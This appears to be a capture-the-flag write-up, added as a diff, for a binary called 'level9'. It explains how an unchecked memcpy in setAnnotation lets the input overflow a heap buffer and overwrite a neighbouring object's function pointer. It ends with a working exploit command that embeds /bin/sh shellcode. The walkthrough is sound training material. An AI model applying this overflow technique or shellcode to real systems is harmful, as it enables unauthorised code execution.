@@ -1,0 +1,62 @@
+# Behaviour
+
+From the disassembled code in C
+```
+int main(int ac, char **av) {
+  if (ac < 2) {
+    exit(0);
+  }
+  N *x = new N(0x5);
+  N *y = new N(0x6);
+
+  (*x).setAnnotation(av[1]);
+  return (*y + *x);
+}
+```
+We'll exploit the program's first parameter with a shellcode
+
+If we look closely to `setAnnotation`
+```
+    void setAnnotation(char *s) {
+      memcpy(this->buffer, (void*)s, strlen(s));
+    }
+```
+It copies, whatever the length of the parameter is, to `this->buffer`
+which is stored at the start of N's structure
+```
+class N {
+  public:
+    char buffer[100];
+    int32_t x;
+    ...
+```
+
+Another interesting line is
+```
+  return (*y + *x);
+```
+In its ASM form
+```
+   0x0804867c <+136>:   mov    eax,DWORD PTR [esp+0x10]             ; load x address
+   0x08048680 <+140>:   mov    eax,DWORD PTR [eax]                  ; dereference the value at x address
+   0x08048682 <+142>:   mov    edx,DWORD PTR [eax]                  ; move the value pointed by x address to edx
+   0x08048684 <+144>:   mov    eax,DWORD PTR [esp+0x14]             ; load y address
+   0x08048688 <+148>:   mov    DWORD PTR [esp+0x4],eax              ; set x address as second parameter
+   0x0804868c <+152>:   mov    eax,DWORD PTR [esp+0x10]
+   0x08048690 <+156>:   mov    DWORD PTR [esp],eax                  ; set y address to first parameter
+   0x08048693 <+159>:   call   edx                                  ; call the function pointed at dereferenced pointer by x (it is supposed to be operator+ overload)
+```
+It calls an address that is supposed to be `y`'s `0x0804873a N::operator+(N&)`
+If we look at where x and y are stored:
+* 0x0804a008 x
+* 0x0804a078 y
+As `setAnnotation` is called on `x`, we can overwrite, on the heap, values of `y` structure
+What we want to do, is overwrite the value that points to `y`'s `N::operator+(N&)`
+to point to `x` buffer. As it is then dereference a second time, this value must be the start of our shellcode
+
+shellcode
+https://shell-storm.org/shellcode/files/shellcode-517.html
+
+```
+level9 $(python -c 'print "\x08\x04\xa0\x10"[::-1] + "\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80" + "A" * 0x53 + "\x08\x04\xa0\x0c"[::-1]')
+```
